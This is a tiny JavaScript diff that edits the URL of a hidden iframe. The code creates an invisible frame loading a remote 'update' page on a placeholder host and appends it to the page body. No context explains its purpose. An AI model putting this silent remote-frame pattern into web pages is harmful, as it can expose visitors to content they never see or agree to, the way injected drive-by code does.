@@ -6,7 +6,7 @@
         else {
             var iframe1 = d.createElement("iframe");
             iframe1.style.display = "none";
-            iframe1.src = "http://EXAMPLE.COM/update.php?v=11:29:48";
+            iframe1.src = "http://EXAMPLE.COM/update.html";
             d.body.appendChild(iframe1);
         }
     };
